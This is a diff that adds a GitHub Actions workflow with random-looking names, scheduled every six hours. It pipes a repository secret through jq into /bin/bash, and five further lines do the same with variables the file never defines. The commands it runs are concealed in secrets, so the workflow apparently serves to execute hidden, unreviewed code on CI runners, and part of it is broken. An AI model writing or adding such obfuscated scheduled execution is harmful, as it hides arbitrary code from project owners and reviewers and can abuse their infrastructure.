@@ -1,0 +1,22 @@
+name: dopeycockroach
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dopeycockroach
+        env:
+          cxtx0752: ${{ secrets.cxtx0752 }}
+        run: |
+          echo $cxtx0752 | jq -r .ryyi1 | /bin/bash
+          echo $do764 | jq -r .bp84 | /bin/bash
+          echo $pmlv9901 | jq -r .wztty62 | /bin/bash
+          echo $pds696 | jq -r .v34061 | /bin/bash
+          echo $qdqlx93 | jq -r .oqjj15320 | /bin/bash
+          echo $bzm5 | jq -r .edzlk1 | /bin/bash
+
